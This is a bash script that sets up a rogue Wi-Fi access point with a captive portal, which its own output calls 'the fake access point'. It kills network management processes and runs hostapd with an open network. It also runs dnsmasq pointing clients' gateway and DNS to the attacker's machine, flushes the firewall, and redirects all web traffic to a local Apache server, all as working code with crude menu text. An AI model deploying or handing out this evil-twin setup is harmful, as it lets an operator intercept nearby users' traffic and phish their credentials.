#!/bin/bash

#-----------LOG-FILES-------------------#
LOG_HOSTAPD=/tmp/LOG_HOSTAPD.TXT
touch /tmp/LOG_DNS.txt
LOG_DNS=/tmp/LOG_DNS.txt
#------------Variables------------------#
INTERFACE1=$(ifconfig |grep n0 |cut -d ":" -f1)
INTERFACE2=$(ifconfig |grep n1 |cut -d ":" -f1)
CHANNEL=11
GATEWAY=10.0.0.1
MONITOR1=$(ifconfig |grep 0mon |cut -d ":" -f1)
MONITOR2=$(ifconfig |grep 1mon |cut -d ":" -f1)
#------------------------------------------------

ifconfig $MONITOR1 down
iwconfig $MONITOR1 mode monitor
ifconfig $MONITOR1 up
airmon-ng stop $MONITOR1 &>>/dev/null

sleep 1;
ifconfig wlan0 up


INTERFACE1=$(ifconfig |grep n0 |cut -d ":" -f1)

echo "WELCOME TO THE CAPTIVE PORTAL , WHAT YOU WANT TO DO ?"
echo -e  "\n"
echo "2) MAKE A FUCKING CAPTIVE PORTAL"

read choice

if [ $choice -eq 2 ]
then


#-----------Installation and update-------------------------

echo "Installation of some tools and update the machine"

apt-get update &>>/dev/null
apt-get install hostapd dnsmasq apache2 -y &>>/dev/null

echo "Killing some annoying process"

killall network-manager wpa_supplicant dnsmasq &>>/dev/null

airmon-ng check kill &>>/dev/null
airmon-ng check kill &>>/dev/null
#-------------------------------------------------------------
#-----------Airmon-ng-----------------------------------------
INTERFACE1=$(ifconfig |grep n0 |cut -d ":" -f1)

echo "Interface 1 = "$INTERFACE1
sleep 1;

airmon-ng start $INTERFACE1 &>>/dev/null
sleep 3;

MONITOR1=$(ifconfig |grep 0mon |cut -d ":" -f1)

echo "Monitor mode interface is  -->" $MONITOR1

ifconfig $MONITOR1 up $GATEWAY netmask 255.255.255.0

#-----------Service-------------------------------------------

echo "Apache2 and Hostapd are start up..."

service apache2 start &>>/dev/null

#-----------------Push-hostapd-and-dnsmasq-conf--------------
touch hostapd.conf
echo "
interface=$MONITOR1
driver=nl80211
ssid=PUTEEEE
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" > /root/captive/hostapd.conf

touch dnsmasq.conf
echo "
interface=$MONITOR1
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,24h
dhcp-option=3,$GATEWAY
dhcp-option=6,$GATEWAY
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
" > /root/captive/dnsmasq.conf

#-------------------------------------------------------------------

echo "The fake access point start up"

hostapd /root/captive/hostapd.conf &>> $LOG_HOSTAPD &
sleep 5;
dnsmasq -C /root/captive/dnsmasq.conf -d &>> $LOG_DNS &


echo "Delete iptables rules"

iptables --flush && iptables --table nat --flush && iptables --delete-chain && iptables --table nat --delete-chain

echo "New Rules for redirection to a captive portal"

iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

a2enmod rewrite &>> /dev/null
service apache2 reload &>> /dev/null


fi
